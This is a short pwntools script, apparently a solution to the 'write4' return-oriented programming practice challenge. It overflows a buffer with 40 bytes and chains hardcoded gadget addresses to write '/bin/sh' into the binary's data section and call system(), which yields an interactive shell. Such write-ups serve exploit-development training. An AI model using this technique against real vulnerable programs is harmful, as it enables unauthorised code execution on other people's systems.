from pwn import *
context.log_level = 'debug'
e = ELF("./write4")
system = p64(e.symbols["system"])
pop_r14_r15 = p64(0x0000000000400890)
mov_r14_r15 = p64(0x0000000000400820)
pop_rdi = p64(0x0000000000400893)
data = p64(0x00601050)
data1 = p64(0x00601050+8)

payload = "a"*40
payload += pop_r14_r15+data+"/bin/sh\x00"
payload += mov_r14_r15
#  payload += pop_r14_r15+data1+p64(0)
#  payload += mov_r14_r15
payload += pop_rdi+data
payload += system



p = process("./write4")
print p.recv()
p.sendline(payload)

p.interactive()


